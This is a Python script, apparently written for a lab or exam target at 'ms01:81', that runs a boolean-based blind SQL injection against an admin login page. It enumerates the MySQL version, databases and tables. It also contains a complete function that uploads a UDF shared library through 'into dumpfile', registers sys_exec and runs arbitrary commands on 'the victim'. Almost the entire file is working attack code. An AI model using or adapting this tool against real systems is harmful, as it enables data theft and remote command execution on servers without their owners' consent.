#!/usr/bin/env python3

import aiohttp
import asyncio
import aiofiles
import sys
import os
import signal
import pathlib
import argparse
import colorama
from base64 import b16encode
from multiprocessing import cpu_count
from string import ascii_lowercase, ascii_uppercase, digits, punctuation
from colorama import Fore, Style

URL = "http://ms01:81/admin/login.php"
data = {
    "username": "admin",
    "password": "herpderp",
    "login": "",
}
INJECT_POINT = "username"
INJECT_TEMPLATE = "admin' {} -- #"
SUCCESS_MARKER = "Incorrect password"
ERROR_MARKER = "Notice"


colorama.init(autoreset=True)

# safe_punc = punctuation.replace("%", "").replace("'", "")
# CHARSET = "".join(sorted(ascii_lowercase + ascii_uppercase + digits + safe_punc))
CHARSET = "".join(sorted(ascii_lowercase + ascii_uppercase + digits + punctuation))

ARCH_X86 = "x86"
ARCH_X64 = "x86_64"
WINDOWS = "Windows"
LINUX = "Linux"

LIB_PARENTDIR = "/usr/share/metasploit-framework/data/exploits/mysql"
LIB_BASENAME = {ARCH_X86: "lib_mysqludf_sys_32", ARCH_X64: "lib_mysqludf_sys_64"}
LIB_EXT = {WINDOWS: ".dll", LINUX: ".so"}

MYSQL_DEFAULT_DBS = ("mysql", "information_schema", "performance_schema", "sys")


def make_logger(color, marker):
    def logger(msg, stderr=True):
        stream = sys.stderr if stderr else sys.stdout
        print(f"{color}[{marker}] {msg}", file=stream)

    return logger


info = make_logger(Fore.BLUE, "*")
warn = make_logger(Fore.YELLOW, "!")
error = make_logger(Fore.RED, "x")
success = make_logger(Fore.GREEN, "+")


def die(msg, stderr=True):
    error(msg, stderr)
    os._exit(1)


def sigint_handler(sig, frame):
    if sig != signal.SIGINT:
        die(f"Unexpected SIGNAL: {sig} ({signal.strsignal(sig)})")
    warn("Caught Ctrl+C! Exiting...")
    os._exit(0)


signal.signal(signal.SIGINT, sigint_handler)


def sanitize_sql_string(string: str):
    return string.replace("\\", "\\\\").replace("'", "\\'")


async def sqli_success(inject):
    """
    Returns true if the SQL injection resulted in a successful response
    """
    data[INJECT_POINT] = inject
    async with aiohttp.ClientSession() as s:
        async with s.post(URL, data=data) as resp:
            first = resp.history[0]
            if first.status != 302:
                die(
                    f"Got bad response code ({first.status}):\n"
                    f"{Style.RESET_ALL + await first.text()}"
                )
            text = await resp.text()
    if ERROR_MARKER in text:
        die(f"Malformed injection: {Style.RESET_ALL + data[INJECT_POINT]}")
    return SUCCESS_MARKER in text


async def test_detect_success(
    good_inject,
    fail_inject,
):
    succ = await sqli_success(good_inject)
    if not succ:
        die(f"Didn't detect SQLi success as expected: {good_inject}")

    fail = await sqli_success(fail_inject)
    if fail:
        die(f"Detected SQLi success when fail expected: {fail_inject}")


async def test_basic():
    info("Testing basic SQLi detection ability")
    good_inject = INJECT_TEMPLATE.format("and 1=1")
    fail_inject = INJECT_TEMPLATE.format("and 1=0")
    await test_detect_success(good_inject, fail_inject)


async def get_integer(
    integer_subquery,
):
    """
    Returns the desired integer value by performing binary search SQLi.
    """
    inject_template = INJECT_TEMPLATE.format(f"and {integer_subquery}{{}}")
    low = 0
    high = 0
    mid = 0

    async def seek_high():
        hi = 1
        while True:
            inject = inject_template.format(f">{hi}")
            if await sqli_success(inject):
                hi *= 2
            else:
                return hi

    async def seek_low():
        lo = -1
        while True:
            inject = inject_template.format(f"<{lo}")
            if await sqli_success(inject):
                lo *= 2
            else:
                return lo

    async def binary_search(hi, lo):
        while True:
            mid = lo + (hi - lo) // 2
            if mid == lo:
                return hi
            inject = inject_template.format(f">{mid}")
            if await sqli_success(inject):
                lo = mid
            else:
                hi = mid

    inject = inject_template.format(f">{mid}")
    is_greater = await sqli_success(inject)

    inject = inject_template.format(f"<{mid}")
    is_less = await sqli_success(inject)

    if is_greater and is_less:
        die(f"Injection always returns TRUE! {Style.RESET_ALL + inject_template}")
    if not (is_greater or is_less):
        die(f"Injection always returns FALSE! {Style.RESET_ALL + inject_template}")

    if is_greater:
        high = await seek_high()
    elif is_less:
        low = await seek_low()

    return await binary_search(lo=low, hi=high)


async def get_strlen(
    string_subquery,
):
    info(f"Getting length of string '{string_subquery}'...")
    subquery = f"length({string_subquery})"
    strlen = await get_integer(subquery)
    success(f"Length({string_subquery}) = {strlen}")
    return strlen


async def get_char_at(idx, string_subquery, test_query=False):
    char_subquery_template = f"and ascii(mid({string_subquery},{{}},1)){{}}"
    inject_template = INJECT_TEMPLATE.format(char_subquery_template)

    if test_query:
        good_inject = inject_template.format(1, "<256")
        fail_inject = inject_template.format(1, ">256")
        await test_detect_success(good_inject, fail_inject)

    lo = 0
    hi = len(CHARSET) - 1
    while True:
        mid = lo + (hi - lo) // 2
        if mid == lo:
            c = CHARSET[hi]
            inject = inject_template.format(idx + 1, f"={ord(c)}")
            if await sqli_success(inject):
                return c
            else:
                die(f"Unable to find char at index {idx}, expected {c}")
        c = CHARSET[mid]
        inject = inject_template.format(idx + 1, f">'{ord(c)}'")
        # info(f"Injecting ({idx}, {c}): {inject}")
        if await sqli_success(inject):
            lo = mid
        else:
            hi = mid


async def build_string(string_subquery, string_start=""):
    if string_start and await match_string(string_subquery, string_start):
        return string_start

    strlen = await get_strlen(string_subquery)
    if strlen == 0:
        return ""

    found = list(string_start.ljust(strlen))

    async def thread_worker(i):
        c = await get_char_at(i, string_subquery)
        found[i] = c
        return c

    info(f"Building out string '{string_subquery}'...")
    async with asyncio.TaskGroup() as tg:
        futures = []
        for i in range(len(string_start), strlen):
            futures.append((tg.create_task(thread_worker(i))))
        for future in asyncio.as_completed(futures):
            await future
            print(f"\r{''.join(found)}", end="", file=sys.stderr)
    print(file=sys.stderr)
    return "".join(found)


async def match_string(string_subquery, match_string):
    match_string = sanitize_sql_string(match_string)
    inject = INJECT_TEMPLATE.format(f"and {string_subquery}='{match_string}'")
    return await sqli_success(inject)


async def get_db_version(string_start=""):
    info("Getting DB version...")
    subquery = "@@version"
    version = await build_string(subquery, string_start)
    success(f"DB version: {version}")
    return version


async def get_arch():
    info("Getting CPU architecture...")
    subquery = "@@version_compile_machine"
    strlen = await get_strlen(subquery)
    if strlen == 3 and await match_string(subquery, ARCH_X86):
        arch = ARCH_X86
    elif strlen == 6 and await match_string(subquery, ARCH_X64):
        arch = ARCH_X64
    else:
        arch = await build_string(subquery)
    success(f"CPU Arch: {arch}")
    return arch


async def get_plugin_dir(string_start=""):
    info("Getting plugin_dir...")
    subquery = "@@plugin_dir"
    plugin_dir = await build_string(subquery, string_start)
    success(f"Plugin dir: {plugin_dir}")
    return plugin_dir


async def get_os():
    info("Getting OS...")
    subquery = "@@version_compile_os"
    if await match_string(subquery, LINUX):
        os = LINUX
    elif await match_string(subquery, "Win64") or await match_string(subquery, "Win32"):
        os = WINDOWS
    else:
        os = await build_string(subquery)
    success(f"OS: {os}")
    return os


async def get_num_dbs():
    info("Getting number of DBs...")
    subquery = "(select count(distinct(schema_name)) from information_schema.schemata)"
    num = await get_integer(subquery)
    success(f"DB count = {num}")
    return num


async def get_db_names(num_dbs=None):
    defaults = set(MYSQL_DEFAULT_DBS)
    info("Getting DB names...")
    subquery_template = "(select distinct schema_name from information_schema.schemata order by schema_name limit {},1)"
    num_dbs = await get_num_dbs() if num_dbs is None else num_dbs
    dbs = []
    for i in range(num_dbs):
        subquery = subquery_template.format(i)
        for default in defaults:
            if await match_string(subquery, default):
                defaults.remove(default)
                dbs.append(default)
                success(f"Got DB name: {default} (default)")
                break
        else:
            db = await build_string(subquery)
            dbs.append(db)
            success(f"Got DB name: {db}")
    return dbs


async def get_num_tables(db):
    info(f"Getting number of tables in database '{db}'...")
    hexname = b16encode(db.encode()).decode()
    subquery = f"(select count(table_name) from information_schema.tables where table_schema=0x{hexname})"
    num = await get_integer(subquery)
    success(f"Table count for '{db}': {num}")
    return num


async def get_table_names(db, num_tables=None):
    info(f"Getting table names in database '{db}'...")
    subquery_template = f"(select distinct table_name from information_schema.tables where table_schema = '{db}' order by table_name limit {{}},1)"
    num_tables = await get_num_tables(db) if num_tables is None else num_tables
    tables = []
    for i in range(num_tables):
        subquery = subquery_template.format(i)
        table = await build_string(subquery)
        tables.append(table)
        success(f"Got table name: {table}")
    return tables


async def exploit(cmdline, arch, os, plugin_dir):
    # get hex-encoded bytes of appropriate shared library
    libname = LIB_BASENAME[arch] + LIB_EXT[os]
    libpath = str(pathlib.PurePath(LIB_PARENTDIR, libname))
    info(f"Using shared library: {libpath}")
    async with aiofiles.open(libpath, "rb") as f:
        contents = await f.read()
    hexdata = b16encode(contents).decode()

    libname = f"udf{ LIB_EXT[os]}"
    if os == WINDOWS:
        libpath = str(pathlib.PureWindowsPath(plugin_dir, libname)).replace("\\", "/")
    else:
        libpath = str(pathlib.PurePosixPath(plugin_dir, libname))

    info(f"Injecting and loading shared library at: {libpath}")
    injects = [
        f"select binary 0x{hexdata} into dumpfile '{sanitize_sql_string(libpath)}'",
        f"create function sys_exec returns integer soname '{sanitize_sql_string(libname)}'",
    ]
    for inj in injects:
        inject = INJECT_TEMPLATE.format(f" or ({inj})")
        if not await sqli_success(inject):
            warn(f"Encountered error during exploit setup:\n{inj}")

    # execute command and get output
    cmdline = sanitize_sql_string(cmdline)
    exec_subquery = f"(select sys_exec('{cmdline}'))"
    return await build_string(exec_subquery)


async def main(args):
    # test_basic()

    version = "5.7.36"
    # version = await get_db_version()

    num_dbs = 5
    # num_dbs = await get_num_dbs()

    # db_names = ["apsystem", "information_schema", "mysql", "performance_schema", "sys"]
    db_names = await get_db_names(num_dbs)
    new_dbs = set(db_names) - set(MYSQL_DEFAULT_DBS)

    table_names = {
        "apsystem": [
            "admin",
            "attendance",
            "cashadvance",
            "deductions",
            "employees",
            "overtime",
            "position",
            "schedules",
        ]
    }
    for db in new_dbs:
        table_names[db] = await get_table_names(db)

    plugin_dir = "c:\\wamp64\\bin\\mysql\\mysql5.7.36\\lib\\plugin\\"
    # plugin_dir = await get_plugin_dir(string_start=plugin_dir)

    arch = ARCH_X64
    # arch = await get_arch()

    os = WINDOWS
    # os = await get_os()

    # await exploit(args.cmdline, arch, os, plugin_dir)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Boolean-based blind MySQL injection tool"
    )
    parser.add_argument(
        "-c", "--cmdline", type=str, help="The command you want to run on the victim"
    )
    args = parser.parse_args()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(args))
